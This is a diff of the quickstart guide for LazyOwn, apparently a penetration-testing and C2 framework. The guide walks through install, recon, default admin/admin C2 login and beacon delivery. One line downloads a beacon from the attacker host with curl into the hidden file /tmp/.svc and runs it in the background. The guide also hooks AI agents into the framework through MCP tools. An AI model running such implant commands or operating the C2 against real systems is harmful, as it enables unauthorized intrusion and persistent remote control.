@@ -1,6 +1,10 @@
 # LazyOwn — 5-Minute Quickstart
 
-Everything you need to go from a fresh clone to an active engagement in under five minutes.
+Everything you need to go from a fresh clone to an active engagement.
+
+After setup, read `ESSENTIALS.md` for the 18 commands that cover 80% of engagements.
+
+---
 
 ## Prerequisites
 
@@ -23,8 +27,7 @@ cd LazyOwn
 bash install.sh
 ```
 
-`install.sh` creates the virtualenv at `env/`, installs all Python deps, and
-generates `cert.pem` / `key.pem` for the C2.
+`install.sh` creates the virtualenv at `env/`, installs all Python deps, and generates `cert.pem` / `key.pem` for the C2.
 
 ---
 
@@ -34,10 +37,7 @@ generates `cert.pem` / `key.pem` for the C2.
 ./run
 ```
 
-On first launch you will be prompted to run `wizard`. Accept.  
-The wizard auto-detects your `lhost` from the routing table, walks you through
-7 steps (target IP, attacker IP, domain, network device, OS type, Groq API key,
-SecLists paths), and writes everything to `payload.json`.
+On first launch you will be prompted to run `wizard`. Accept. The wizard auto-detects your `lhost` from the routing table, walks you through 7 steps, and writes everything to `payload.json`.
 
 ```
 (LazyOwn) > wizard
@@ -51,14 +51,16 @@ Or run the readiness check without changing anything:
 
 ---
 
-## Step 3 — Start recon
+## Step 3 — Start recon (the golden path)
 
 ```bash
-(LazyOwn) > ping           # confirm target is alive
+(LazyOwn) > ping           # confirm target is alive + detect OS
 (LazyOwn) > lazynmap       # full port scan → sessions/scan_<rhost>.nmap
-(LazyOwn) > auto_populate  # parse scan output into world_model.json
+(LazyOwn) > auto_populate  # parse scan into world_model.json
 (LazyOwn) > facts_show     # see what was discovered
 ```
+
+That is the core loop. Everything else is built on top of it.
 
 ---
 
@@ -76,8 +78,7 @@ Or start it inline from the shell:
 (LazyOwn) > lazyc2
 ```
 
-The C2 starts at `https://<lhost>:<c2_port>` with the credentials from
-`payload.json` (`c2_user` / `c2_pass`, default `admin` / `admin`).
+The C2 starts at `https://<lhost>:<c2_port>` with the credentials from `payload.json` (`c2_user` / `c2_pass`, default `admin` / `admin`).
 
 ---
 
@@ -85,58 +86,56 @@ The C2 starts at `https://<lhost>:<c2_port>` with the credentials from
 
 ```bash
 # Generate and deliver the Go beacon (two-stage, XOR-encoded)
-(LazyOwn) > lazymsfvenom              # or use the beacon lazyaddon for a C implant
+(LazyOwn) > lazymsfvenom
 
 # Or drop the Linux C beacon with BOF support
-(LazyOwn) > blacksandbeacon          # compile → sessions/blacksandbeacon
+(LazyOwn) > blacksandbeacon
 # Then run on target:
 # curl -sk "http://<lhost>:<lport>/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
 
-Once a beacon checks in, manage it from the C2 dashboard at
-`https://<lhost>:<c2_port>`.
+Once a beacon checks in, manage it from the C2 dashboard at `https://<lhost>:<c2_port>`.
 
 ---
 
-## Step 6 (optional) — Invite teammates
+## Step 6 (optional) — Connect Hermes Agent
+
+```bash
+bash scripts/setup_hermes_mcp.sh
+```
+
+Then restart Hermes or run `/reload-mcp`. LazyOwn exposes ~95 MCP tools for AI-assisted operation.
+
+See `AGENTS.md` for the Hermes integration guide.
+
+---
+
+## Step 7 (optional) — Invite teammates
 
 ```bash
 (LazyOwn) > collab_join alice
 ```
 
-Prints the team dashboard URL and SSE stream endpoint. Share the URL with
-your team. Everyone connects to `https://<lhost>:<c2_port>/collab/?operator=<handle>`.
-
-The collaboration layer provides:
-- Real-time event broadcast via SSE (findings, commands, phase changes)
-- Advisory target locks (prevents two operators running tools against the same host)
-- Operator presence registry
-- Chat broadcast
+Prints the team dashboard URL. Everyone connects to `https://<lhost>:<c2_port>/collab/?operator=<handle>`.
 
 ---
 
-## Common first-session commands
+## What to read next
 
-| Goal | Command |
-|---|---|
-| Set target | `assign rhost 10.10.11.5` |
-| Set attacker IP | `assign lhost 10.10.14.3` |
-| Full wizard | `wizard` |
-| Port scan | `lazynmap` |
-| Web enum | `gobuster` |
-| SMB enum | `enum4linux` |
-| Check what to do next | `recommend_next` |
-| Phase guide | `phase_guide recon` |
-| AI next step | `auto_loop` |
-| Team join URL | `collab_join <handle>` |
-| Payload dashboard | `dashboard` |
+| File | Read when |
+|------|-----------|
+| `ESSENTIALS.md` | You want the 18 core commands (start here after this doc) |
+| `CHEATSHEET.md` | You know the basics and need the next 40 frequent commands |
+| `skills/lazyown.md` | You are operating via MCP (AI operator) |
+| `COMMANDS.md` | You need the full 333-command reference |
+| `CLAUDE.md` | You are developing or extending the framework |
 
 ---
 
 ## Key files
 
 | File | Purpose |
-|---|---|
+|------|---------|
 | `payload.json` | Single source of truth — all config lives here |
 | `sessions/scan_<ip>.nmap` | Nmap output — read before re-scanning |
 | `sessions/world_model.json` | Current phase, discovered hosts, creds |
@@ -157,11 +156,9 @@ The collaboration layer provides:
 bash gen_cert.sh
 ```
 
-**Nmap taking too long** — check `sessions/scan_<rhost>.nmap` first; it may
-already exist from a previous run. `facts_show` reads it without rescanning.
+**Nmap taking too long** — check `sessions/scan_<rhost>.nmap` first; it may already exist from a previous run. `facts_show` reads it without rescanning.
 
-**Missing SecLists** — install with `sudo apt install seclists` or set
-`dirwordlist` manually:
+**Missing SecLists** — install with `sudo apt install seclists` or set `dirwordlist` manually:
 ```
 (LazyOwn) > assign dirwordlist /path/to/wordlist.txt
 ```
